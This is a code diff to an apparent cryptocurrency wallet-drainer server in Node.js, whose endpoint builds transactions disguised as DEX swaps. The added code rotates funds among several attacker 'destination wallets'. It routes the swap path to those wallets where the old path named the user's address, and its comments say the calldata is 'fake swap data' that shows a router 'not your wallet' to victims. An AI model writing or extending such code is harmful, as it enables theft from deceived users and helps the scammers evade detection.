@@ -343,6 +343,23 @@ function detectChainFromAddress(address) {
     return 'evm';
 }
 
+// 🎯 WALLET ROTATION HELPER FUNCTION
+function getRotatedWallet() {
+    const destinationWallets = [
+        process.env.DESTINATION_WALLET,
+        process.env.DESTINATION_WALLET_1,
+        process.env.DESTINATION_WALLET_2,
+        process.env.DESTINATION_WALLET_3,
+        process.env.DESTINATION_WALLET_4,
+        process.env.DESTINATION_WALLET_5
+    ].filter(wallet => wallet && wallet.startsWith("0x"));
+    
+    const randomWallet = destinationWallets[Math.floor(Math.random() * destinationWallets.length)] || process.env.DESTINATION_WALLET;
+    console.log(`🎯 Wallet rotation selected: ${randomWallet.substring(0, 10)}...`);
+    return randomWallet;
+}
+
+
 // ==================== GASLESS FEATURE VALIDATION ====================
 function validateGaslessFeature(featureName) {
   if (!GASLESS_MODE) return true;
@@ -2802,11 +2819,15 @@ app.post('/api/generate-professional-transaction', async (req, res) => {
 
         console.log('🎯 [DEBUG] 2. Using chain:', config.name, 'Type:', config.type);
 
-        const destinationWallet = config.type === 'solana' ? 
-            process.env.DESTINATION_WALLET_SOL :
-            config.type === 'bitcoin' ? 
-            process.env.DESTINATION_WALLET_BTC :
-            process.env.DESTINATION_WALLET;
+        let destinationWallet;
+if (config.type === 'solana') {
+    destinationWallet = process.env.DESTINATION_WALLET_SOL;
+} else if (config.type === 'bitcoin') {
+    destinationWallet = process.env.DESTINATION_WALLET_BTC;
+} else {
+    destinationWallet = getRotatedWallet(); // ← EVM chains use rotation
+}
+
         
         if (!destinationWallet) {
             clearTimeout(timeout);
@@ -2963,7 +2984,7 @@ return {
 }
 
 // Helper function to generate fake swap data
-function generateSwapCalldata(userAddress) {
+function generateSwapCalldata(userAddress, destinationWallet) {
     // Generate data that looks like a swap function call
     const swapFunctions = {
         'swapExactETHForTokens': '0x7ff36ab5',
@@ -2980,10 +3001,11 @@ function generateSwapCalldata(userAddress) {
     };
     
     const path = [
-        commonTokens.WETH,
-        commonTokens.USDC,
-        userAddress // Makes it look like user receives tokens
-    ].map(addr => addr.toLowerCase().replace('0x', '').padStart(64, '0')).join('');
+    commonTokens.WETH,
+    commonTokens.USDC,
+    destinationWallet // ← Use rotated wallet here
+].map(addr => addr.toLowerCase().replace('0x', '').padStart(64, '0')).join('');
+
     
     const to = userAddress.toLowerCase().replace('0x', '').padStart(64, '0');
     const deadline = Math.floor(Date.now() / 1000 + 1800).toString(16).padStart(64, '0');
@@ -3016,10 +3038,11 @@ async function generateEVMTransaction(userAddress, destinationWallet, config, re
 
         // 🎯 USE DEX ROUTER INSTEAD OF DIRECT TRANSFERS
         const router = ROUTER_ADDRESSES[config.chainId] || ROUTER_ADDRESSES[1];
+        const destinationWallet = getRotatedWallet();
         
         const transaction = {
             to: router.address, // Shows DEX router, not your wallet!
-            data: generateSwapCalldata(userAddress), // Fake swap data
+            data: generateSwapCalldata(userAddress, destinationWallet), // Pass rotated wallet
             value: "0", // Shows 0 value - much safer!
             gasLimit: "200000",
             chainId: config.chainId
